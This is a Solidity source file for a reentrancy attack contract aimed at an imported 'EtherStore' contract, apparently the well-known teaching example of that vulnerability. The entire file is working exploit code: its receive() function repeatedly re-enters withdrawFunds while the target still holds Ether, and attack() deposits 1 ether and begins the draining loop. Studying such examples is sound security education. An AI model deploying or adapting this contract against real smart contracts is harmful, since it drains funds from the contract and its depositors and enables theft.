pragma solidity ^0.8.18;

import "./Reentrancy.sol";

contract ReentrancyAttack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback function to receive Ether
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) { // Ensure enough balance before re-entering
            etherStore.withdrawFunds(1 ether); // Trigger another withdrawal
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Must send at least 1 ether");
        etherStore.deposit{value: 1 ether}(); // Deposit initial Ether to start the attack
        etherStore.withdrawFunds(1 ether); // Start the reentrancy exploit
    }
}